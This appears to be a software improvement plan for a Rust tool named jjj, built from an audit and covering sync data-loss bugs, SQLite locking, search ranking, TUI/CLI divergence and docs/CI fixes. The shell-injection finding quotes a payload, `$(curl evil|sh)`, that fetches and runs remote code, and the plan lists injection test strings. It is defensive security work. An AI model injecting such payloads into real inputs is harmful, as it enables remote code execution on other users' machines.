# jjj Improvement Plan

**Date:** 2026-05-30
**Source:** Synthesized from `AUDIT_FINDINGS.md` — a 13-dimension multi-agent audit (75 agents) with adversarial verification of every medium+ finding. 102 findings: 3 critical, 20 high, 39 medium, 38 low, 2 nit. **0 findings were refuted** on verification; 21 were corrected/down-rated (reflected below).
**Baseline:** Builds clean. **527 tests pass, 0 fail.** ~25 clippy style warnings. This is a mature, well-tested codebase — the issues below are concentrated, not pervasive.

---

## Implementation status (2026-05-30)

All **P0** and **P1** items implemented and verified, plus all of **P2**, most of **P3** (3.2, 3.3, 3.4, 3.6), and most of **P4** (4.3–4.7). Only the two large pure-elegance refactors (3.1, 3.5), the mitigated 2.11, and the reverted 4.1/4.2 remain. Test suite grew 527 → ~550 (regression tests added with each fix); lib is clippy-clean and CI green.

**Done (with regression tests):**
- **P0:** 0.1 fetch base-snapshot (silent data loss) · 0.2 automation shell-injection (RCE → env-passing) · 0.3 rankings sync + atomic write · 0.4 conflict-marker push block · 0.5 remote-deletion reconciliation.
- **P1:** 1.1 SQLite WAL+busy_timeout (+WAL sidecar cleanup) · 1.2 repo-wide re-entrant flock write lock · 1.3 embeddings preserved across reload + prune orphans + honest "(hybrid)" label · 1.4 FTS bm25 `ORDER BY rank` · 1.5 vote_cost saturating.
- **P2:** 2.1 TUI write-path bookkeeping (solution_ids/critique_ids/milestone links/Open→InProgress) · 2.2 auto_close_on_solve · 2.3 closed-issue import → Solved · 2.4 milestone events (CLI+TUI) · **2.5 ranking aggregation redesigned (see below)** · 2.6 unified problem_count for qv_budget · 2.7 `--base` threaded · 2.8 idempotent merge · 2.9 UTF-8 panic + visible event/file skips · 2.10 ordered-sequence merge.
- **P3:** 3.2 ranking three-zone reorder moved from `actions.rs` to `UserOrdering::reorder_by_votes` (test-only duplicate deleted) · 3.3 `EntityType` promoted to a shared `entity_type` module with canonical `as_str`/`table`/`prefix`/`from_singular` mappings (fixes a TUI→db layering inversion; 3 duplicated match sites now use it) · 3.4 `db/entities.rs` four-way `load`/`list`/`delete` collapsed into a `DbEntity` trait + generic `load_one`/`list_all`/`delete_one` (public fns kept as thin wrappers; `upsert`/`row_to` stay per-type) · 3.6 removed the `dump_to_markdown` (DB→markdown) hazard — push/fetch now only `load_from_markdown` (markdown is canonical), so a dirty/empty cache can't wipe the files; function deleted. `borda.rs` renamed to `scoring.rs`.
- **P4:** 4.3 `--json` for `problem tree`/`graph` and `solution diff` · 4.4 detail-scroll clamp · 4.5 README/rank-hint/docs/vscode field cleanup · 4.6 CI macOS matrix + dead build-deps removed · 4.7 lib clippy clean (CI `-D warnings`).

**2.5 — ranking aggregation (implemented, behavior change):** Replaced unnormalized harmonic `N/rank` with **budget-normalized harmonic**: each voter's ordering points sum to the QV budget `B`, distributed by harmonic weight (`B·(1/i)/H_n`). Every voter now has equal total ordering influence regardless of how many items they ranked (removes the length bias), ordering and votes sit on the same scale (votes are a bounded megaphone — a maxed vote ≈ `B` ≈ 3× the top ordinal slot), and the harmonic shape still concentrates weight at the top. Matches the intended UX (triage to tiers = the baseline sort; votes = exceptional + / − emphasis). New tests assert equal-influence, small-vote-doesn't-override, big-vote-overrides, negative-sinks-below-pack. Docs (CLAUDE.md, ranking.md) updated.

**Deferred (rationale):**
- **3.1 full domain layer** and **3.5 `actions.rs` decomposition** — large, cross-cutting *pure-elegance* refactors. The data bugs they would have prevented (the TUI write-path divergence, 2.1) are already fixed directly, so the remaining value is maintainability only. A 1900-LOC TUI file split and a full CLI/TUI domain unification carry real regression risk for low marginal benefit; recommend doing each as its own opted-in, separately-reviewed change rather than bundled here.
- **2.11 no-base whole-record LWW** — `merge_mapping` already resolves per-key; the residual scalar LWW is unavoidable without per-field timestamps, and is rare now that 0.1 keeps the base well-maintained.
- **4.1 destructive-command confirmation** — *attempted, reverted.* A stderr echo of the resolved entity fights the journey-test output assertions (it injects entity titles, tripping legitimate negative assertions) and is only marginally safer than the existing print-after (the op runs regardless without an interactive prompt, which would itself break non-interactive use). Not worth the fragility.
- **4.2 resolve min-length guard** — a blanket short-hex guard would wrongly reject legit title queries that are coincidentally hex ("beef", "face", "dead"). Docstring corrected instead.

---

## Executive assessment

jjj is in good shape structurally. The recent refactors (generic `Persist` trait, `strum` Display, shared cache/dispatch helpers, the Entity/EntityFrontmatter collapse) genuinely paid down duplication, and the test suite is broad. The **core three-way merge algorithm is sound** — it operates on a generic YAML `Value` tree so unknown/future fields are preserved, output is canonically sorted, and the union cases are deterministic and commutative.

The risk is concentrated in **two young subsystems** and clusters into five themes:

1. **Sync lifecycle (data integrity)** — the merge *algorithm* is correct, but the *plumbing* around it loses data: the merge ancestor is mis-advanced on standalone `fetch` (silent loss of local edits), remote deletions resurrect, conflict markers propagate to all clones, and the entire `rankings/` tree is never synced at all.
2. **Automation shell injection (security)** — the documented template-quoting pattern collapses the escaping and gives untrusted fetched titles a path to RCE on a collaborator's machine.
3. **Multi-process robustness** — SQLite opens without WAL/busy_timeout, and shared-file read-modify-write has no locking, so a TUI + CLI in two terminals can throw "database is locked" or lose updates.
4. **Derived-index correctness** — embeddings get wiped on nearly every command and never recomputed (semantic/hybrid search silently degrades to FTS-only), and FTS itself does no relevance ranking, so the RRF fusion input is noise.
5. **TUI/CLI write-path divergence** — the TUI reimplements entity creation and omits relational bookkeeping (`solution_ids`, `critique_ids`, milestone links, status transitions, automation), so data created in the TUI behaves differently from data created on the CLI.

Everything else is correctness polish, ranking-math fidelity, elegance/decomposition, and doc/build hygiene.

The single highest-leverage structural move — which also fixes several Theme-5 bugs — is to **pull entity-mutation and ranking logic out of the front-ends into a shared `domain` layer that both the CLI and TUI call.** Most divergence bugs are symptoms of that missing seam.

---

## Priority tiers

Effort key: **XS** ≈ <1h · **S** ≈ a few hours · **M** ≈ 1–2 days · **L** ≈ multi-day.

### P0 — Stop the bleeding (data loss + RCE). Do before any real multi-user use.

| # | Finding | Where | Fix approach | Effort |
|---|---------|-------|--------------|--------|
| 0.1 | 🔴 **Silent loss of local edits on standalone `fetch`** — trailing `snapshot_base` overwrites the per-file remote ancestor with merged-local content, so next fetch treats local-only edits as "base" and lets a divergent remote silently win. | `fetch.rs:146` vs `fetch.rs:45` | Delete the trailing `snapshot_base(&meta_path, &base_path)`; the per-file `write_base_file(remote_content)` at line 45 already sets the correct ancestor. Extend it to **prune base entries for files absent from the remote listing** (so a remote delete is reflected). Add a regression test for two sequential fetches with no push in between. | S |
| 0.2 | 🔴 **Command injection in automation shell actions** — `'{{title}}'` template + `shell_escape` produces `''value''`, collapsing to unquoted; untrusted fetched titles like `$(curl evil\|sh)` execute on a victim who has an automation rule and submits a solution. | `automation.rs:55-69, 87-92` | Stop building a shell string from untrusted values. Exec via **argv** (`Command::new(prog).args([...])`), expanding each `{{var}}` into one argv element so no shell re-parses it. If a shell is truly needed, pass values via `Command::env` and reference `$JJJ_TITLE`. Fix CLAUDE.md/scenario-18 templates to drop the hand-added quotes. Add a regression test asserting `$(touch X)` / `'; touch X; '` does **not** execute through the documented template. | M |
| 0.3 | 🔴/🟠 **`rankings/` tree is never synced** — push/fetch/merge all hard-code the four entity dirs and exclude `rankings/`, so per-user vote/order files never leave the machine; global Borda+QV aggregation only ever sees the local user. (Also: written with plain `fs::write`, not atomic.) | `push.rs:107`, `fetch.rs:98`, `storage/mod.rs:45 (ENTITY_DIRS)`, `ranking/ordering.rs:88` | Add `rankings/` to the sync workspace copy and the fetch reconcile pass. Each `{user}.json` is owned by exactly one user, so a **per-file last-writer-wins union** (adopt remote files you don't have, keep your own) is sufficient — no three-way merge needed. Switch `save_user_ordering` to the `atomic_write` helper. Add an A-pushes / B-fetches integration test asserting `load_all_orderings` returns both users. | M |
| 0.4 | 🟠 **Conflict markers pass validation and get pushed** — a both-sides body edit writes `<<<<<<<`/`>>>>>>>` into the `.md`; `db::validate` only checks referential integrity, so the conflicted file is pushed and every clone fetches literal markers. | `merge.rs:344-363`, `push.rs:220-235`, `db/validate.rs:38-152` | Add a validation rule scanning each entity body (and raw `.md`) for unresolved conflict markers; **fail the push** with an actionable message until resolved. Optionally also block in `save`/`commit_changes`. | S |
| 0.5 | 🟠 **Remote deletions resurrect** — fetch only walks remote-listed files, never removes local files deleted on the remote; push re-uploads them, undeleting entities (and reintroducing dangling refs via the delete cascade). | `fetch.rs:98-127` | After collecting the remote file set per dir, diff against local: for a file in the base snapshot but absent from the remote that local hasn't re-edited, delete it locally + from cache. Treat delete-vs-local-edit as a surfaced conflict. (Pairs naturally with 0.1's base-pruning.) | M |

### P1 — Multi-process robustness & search correctness.

| # | Finding | Where | Fix approach | Effort |
|---|---------|-------|--------------|--------|
| 1.1 | 🟠 **SQLite opened without WAL/busy_timeout** — TUI + CLI concurrent access throws immediate `SQLITE_BUSY`; fetch unlinks the `.db` out from under live readers. | `db/schema.rs:25-30` | In `Database::open`, set `busy_timeout(5s)` and `journal_mode=WAL`. Rebuild fetch's DB into a temp file + rename instead of unlinking in place. | S |
| 1.2 | 🟠 **Lost updates on back-reference fields** — load→mutate→save on shared files with no lock; concurrent local solution-creates clobber `solution_ids`; same window in `delete_problem` and approve/auto-solve. | `solution.rs:245`, `storage/problems.rs:48-128`, `domain.rs:83-98` | Take a repo-wide advisory write lock (a real `flock`/`fs2`-style exclusive lock that auto-releases on death — not the stale-prone PidLock) around the `with_metadata` critical section. Serializes local writers without changing the file format. | M |
| 1.3 | 🟠 **Embeddings wiped but never recomputed** — `clear_all_tables` deletes embeddings on every `search`/`fetch`/`init`/`list --search`, and only `db rebuild` recomputes them, so hybrid search permanently degrades to FTS-only while still printing "(hybrid)". | `db/sync.rs:439`, `commands/search.rs:23,144` | Drop `DELETE FROM embeddings` from the generic reload (let upsert/delete keep them in step), **or** recompute incrementally after reload, **or** at minimum have search recompute opportunistically when the table is empty and a client is available. Fix the misleading "(hybrid)" label. Add a test that embeddings survive a `load_from_markdown` round-trip. | M |
| 1.4 | 🟠 **FTS does no relevance ranking** — no `bm25()`/`ORDER BY rank`; rows come back in rowid order, so `merge_with_rrf`'s `enumerate()` rank is noise and the FTS half of the fusion is meaningless. | `db/search.rs:66-193, 357-413` | Rank in SQL: `JOIN fts ... ORDER BY fts.rank` (ascending = best). Then the RRF rank is meaningful. Fix/remove the "ranking by relevance" docstring. | M |
| 1.5 | 🟠 **`vote_cost` overflow** — `i32.unsigned_abs()² ` overflows u32 for \|v\|≥65536: wraps to 0 (release, bypassing the QV budget) or panics (debug, crashing `rank show`/TUI). Reachable via hand-edited/corrupted/merged `rankings/*.json`. | `ranking/borda.rs:11-13` | Compute in u64 saturating: `(a*a).min(u32::MAX as u64) as u32`; clamp/validate vote magnitude on load in `load_user_ordering`/`load_all_orderings` so a bad file can't poison aggregation or panic. | S |

### P2 — Correctness & consistency.

| # | Finding | Where | Fix approach | Effort |
|---|---------|-------|--------------|--------|
| 2.1 | 🟠/🟡 **TUI write-path divergence** (cluster): TUI critique-create omits `solution.critique_ids` (breaks the READY next-action); TUI solution-create omits `problem.solution_ids` + Open→InProgress; TUI problem-create omits `milestone.problem_ids`; TUI fires no GitHub automation. | `tui/app/actions.rs:25-106` vs `commands/{critique,solution,problem}.rs` | **Root fix:** extract `domain::create_problem/create_solution/create_critique` performing the full relational bookkeeping + status transitions + automation hooks, and call them from both `commands/*` and `tui/app/actions.rs`. Delete the TUI's parallel implementations. (This is also the top elegance win — see 3.1.) | M |
| 2.2 | 🟠 **`auto_close_on_solve` is dead config** — the only `auto_close_issue` call site is gated behind `if github_close`, so the config field never fires on a plain `problem solve`/`dissolve`. | `problem.rs:583-595`, `hooks.rs:132-151` | Call `auto_close_issue` unconditionally after `solve`/`dissolve` (force = the flag); let the in-function guards decide based on `auto_close_on_solve`/`auto_push`. Keep the `has_explicit_rule` skip. Add a test. | S |
| 2.3 | 🟠 **Importing a closed issue reopens it** — `issue_to_problem` drops the fetched `state`, so the imported problem is Open; next push sees Closed-but-should-be-open and calls `reopen_issue`, mutating remote state against intent. | `sync/github/mapping.rs:8-47`, `sync.rs:816` | Read `json["state"]`; map Closed → Solved/Dissolved (or refuse to import closed issues without a flag). | S |
| 2.4 | 🟠 **Milestone events never emitted, but `events --check` requires them** — every milestone is flagged "no creation event" and every Completed one "no completion event," producing guaranteed false positives. | `milestone.rs:33-113`, `events.rs:248-376` | Emit `MilestoneCreated`/`MilestoneCompleted` (ideally via new `domain` milestone ops), **or** remove the milestone arms from the checker. The two halves must agree. | S |
| 2.5 | 🟡 **Ranking aggregation is harmonic (N/rank), not Borda, and biased by ordering length** — contradicts the documented "Borda count + QV boost"; users with longer orderings get disproportionate weight. | `ranking/borda.rs:31-54` | Implement true Borda points (or document the harmonic scheme honestly and normalize by ordering length so voters are comparable). Decide intended semantics first. | M |
| 2.6 | 🟡 **Three divergent `problem_count` definitions feed `qv_budget`** — a vote accepted interactively can be silently dropped as over-budget during aggregation. | `tui/app/actions.rs:1684`, `tui/app/mod.rs:160`, `commands/...` | Compute `qv_budget` from a single source of truth (one `problem_count` definition shared by the TUI input path and aggregation). | S |
| 2.7 | 🟡 **`--base <branch>` silently ignored** for `github pr` (hardcoded "main"). | `sync.rs:371`, `sync/github/mod.rs:133` | Thread the `_base` param through to the `gh pr create --base` call. | XS |
| 2.8 | 🟡 **`merge → approve_solution` can re-fire `github_merge`** on an already-merged PR. | `sync.rs:603-621` | Guard re-fire (check PR state / idempotency key) before invoking the merge automation. | S |
| 2.9 | 🟡 **Robustness on untrusted input:** `parse_entity_reference` panics on multibyte UTF-8 from `jjj search`; `events.jsonl` silently drops lines on parse failure / unknown type; cache-backed query aborts on one malformed file (FS-walk path tolerates it). | `resolve.rs:85-95`, `storage/events.rs:26-30`, `storage/mod.rs:556-564` | Use char-boundary-safe slicing; log-and-skip unknown event lines with forward-compat (don't drop silently — surface a count); make the cache path skip-and-warn like the FS path. | S |
| 2.10 | 🟡 **Ordered sequences reordered by content-sort during merge** — `merge_sequence` sorts, corrupting order-dependent lists (critique reply threads, `change_ids`). | `merge.rs:270-298` | Treat order-significant sequences as ordered union (preserve first-seen order), not sorted-set union. Decide per-field which sequences are ordered. | M |
| 2.11 | 🟡 **No-base global LWW overwrites untouched fields** — with no base snapshot, one global `updated_at` winner overwrites every conflicting scalar, including fields the winner never touched. | `merge.rs:113,165-182` | When base is absent, fall back to per-field LWW rather than whole-record LWW (or treat missing-base as "adopt remote only for fields local hasn't set"). | M |

### P3 — Elegance & maintainability (high-leverage refactors).

| # | Theme | Where | Approach | Effort |
|---|-------|-------|----------|--------|
| 3.1 | **Shared `domain` layer for all entity mutation** (subsumes 2.1) — the seam that removes TUI/CLI divergence. | `commands/*`, `tui/app/actions.rs`, `domain.rs` | Grow `domain.rs` into the single home for create/transition/relationship ops; front-ends become thin. | M–L |
| 3.2 | **Ranking algorithm trapped in the TUI** — `reorder_by_votes`/tier/vote/cost live as private `App` methods and are *copy-pasted into `ranking/ordering.rs`'s test module*. Backwards dependency. | `tui/app/actions.rs:1368-1919`, `ranking/ordering.rs:406` | Move the three-zone reorder, tier assignment, quadratic-cost, and `default_ordering_for_milestone` into `ranking/ordering.rs` as pure methods on `UserOrdering`; have TUI and `commands/rank` both call them; delete the test-only copy and test the real impl. **Single highest-leverage elegance refactor.** | M |
| 3.3 | **Stringly-typed entity kind** hand-matched in 5+ dispatch sites (display, db/sync, search, commands). | `display.rs:50`, `db/sync.rs:279`, `commands/search.rs`, … | Introduce an `EntityType` enum (with `strum` Display/FromStr) and route all dispatch through it; makes illegal kinds unrepresentable and centralizes the match. | M |
| 3.4 | **`db/entities.rs` repeats the 4-way CRUD** that the `Persist` trait already eliminated in `storage`. | `db/entities.rs:57-512` | Apply the same generic-trait collapse to the DB layer's upsert/load/list/delete. | L |
| 3.5 | **`actions.rs` (1930 LOC) god-object** bundling entity CRUD, tags/confidence, and the whole ranking subsystem. | `tui/app/actions.rs` | Decompose along the three seams (entity ops → `domain` via 3.1; ranking → `ordering.rs` via 3.2; tags/confidence into their own module). After 3.1+3.2 the file shrinks dramatically. | M |
| 3.6 | **`dump_to_markdown` inverts the "cache is derived" contract** (verifier-narrowed: the real hazard is dumping a partially-loaded/stale DB back over canonical markdown after an interrupted bulk load, not a routine two-truth window). | `db/sync.rs:89`, `fetch.rs:70`, `push.rs:218` | Since `save()` already writes markdown-first, the DB can't be the sole holder of an edit — consider deleting `dump_to_markdown`/`is_dirty`/`set_dirty` entirely (accounting for `needs_rebuild()` sharing the meta row). At minimum, never dump a dirty/partial DB over canonical files. | M |

### P4 — UX, docs, build hygiene.

| # | Finding | Where | Fix | Effort |
|---|---------|-------|-----|--------|
| 4.1 | 🟠→🟡 **Fuzzy title match feeds destructive commands** with no confirmation — `withdraw`/`dissolve`/`duplicate`/`approve --force` mutate whatever a substring uniquely matches *today*. | `resolve.rs:64-79`, call sites | Have `resolve` report *how* it matched; for destructive verbs, echo `Resolved "auth" → s/01957d "…" — proceed? [y/N]` on a TTY, refuse in non-interactive mode. Cheapest high-value slice: **echo the resolved id+title before** the mutation (today it only prints after). | S |
| 4.2 | 🟡 **No min-length/hex guard before title fallback** — a prefix typo silently becomes a fuzzy title match. Plus `resolve()` docstring claims FTS matching it never does. | `resolve.rs:41-79` | Require ≥N hex chars or a non-hex string before falling through to title; fix the docstring. | S |
| 4.3 | 🟡 **`--json` coverage gaps** — `problem tree`, `graph`, `solution diff` have no machine-readable output. | `cli.rs:438,499,724` | Add `--json` to the listed commands for scripting parity. | S |
| 4.4 | 🟡 **Detail-pane scroll unbounded** — `G`/over-scroll blanks the pane. | `tui/app/navigation.rs:215-237` | Clamp scroll offset to content height. | S |
| 4.5 | 🟡 **Doc drift:** README `problem duplicate` example fails (`--of` required); README `solution comment` arg order wrong; `rank session` hint points to a removed subcommand; VS Code extension references five removed entity fields. | `README.md:85,97`, `rank.rs:125`, `vscode/src/cli.ts` | Fix examples (ideally as `bash,test` doc-test blocks so the harness catches future drift); update the VS Code extension to the current data model. | S |
| 4.6 | 🟡 **CI is Linux-only** despite stated macOS+Linux support; `[build-dependencies]` declared with no `build.rs`. | `.github/workflows/ci.yml:13`, `Cargo.toml:54` | Add a macOS job to the matrix; remove dead build-deps (or add the intended `build.rs` for completion generation). | S |
| 4.7 | ⚪ **Clippy**: ~25 style warnings (needless borrows, `Default` field-assign, manual prefix-strip, `map_or`). | repo-wide | `cargo clippy --fix`; then add `-D warnings` to CI to prevent regressions. | XS |

### P5 — Test coverage to add (track alongside the fixes above).

These pair with specific fixes; write the test **with** the fix.
- **Three-way-merge integration** (with 0.1/0.5): two users edit the *same* entity — body divergence → conflict markers + warning; scalar divergence → `updated_at` resolves; second fetch is a no-op (base advanced). No existing test has two users touch the same file. (`merge.rs` core *is* well unit-tested; the `fetch.rs` glue and base lifecycle are not.)
- **`merge_mapping` key-add/key-delete branches** and `merge_sequence` removal-vs-addition (governs `solution_ids`/`critique_ids`/`child_ids` integrity) — pure functions, cheap, currently untested.
- **Embeddings survive `load_from_markdown`** (with 1.3); **`vote_cost` overflow/clamp** (with 1.5); **`auto_close_on_solve` fires without the flag** (with 2.2); **closed-issue import doesn't reopen** (with 2.3); **automation shell-injection is inert** (with 0.2).
- **Make the GitHub e2e test hermetic** — it currently mutates a real shared remote and depends on network/replication timing. Tighten over-tolerant negative-test assertions.

---

## Suggested execution order

1. **Milestone A — "No data loss, no RCE" (P0).** 0.1 → 0.4 → 0.5 (sync lifecycle, share a base-pruning helper) · 0.2 (security, independent) · 0.3 (rankings sync). Ship with the merge-integration + injection tests. This is the gate before recommending jjj for real multi-user use.
2. **Milestone B — "Robust under concurrency, search works" (P1).** 1.1 + 1.2 (locking/WAL together) · 1.3 + 1.4 (search correctness together) · 1.5.
3. **Milestone C — "One write path" (P2/3.1).** Build the shared `domain` layer (3.1) and land the TUI-divergence fixes (2.1) on top of it; then the GitHub-sync correctness items (2.2, 2.3, 2.7, 2.8) and robustness (2.9).
4. **Milestone D — Ranking fidelity (2.5, 2.6, 3.2).** Decide Borda-vs-harmonic semantics, move the algorithm into `ordering.rs`, unify `problem_count`.
5. **Milestone E — Elegance & hygiene (3.3–3.6, P4).** EntityType enum, actions.rs decomposition, db CRUD dedup, docs/CI/clippy.

## What's healthy (keep)
- The merge **algorithm** (Value-tree, field-preserving, canonical sort, commutative unions) — only its lifecycle needs fixing.
- The recent dedup refactors (`Persist`, strum, shared helpers) — extend the same pattern to `db/entities.rs` and entity-kind dispatch.
- Broad, passing test suite (527) and clean build — the foundation to land all of the above safely.

---

_Full per-finding detail, locations, evidence, and verification verdicts: see `AUDIT_FINDINGS.md` in this directory._
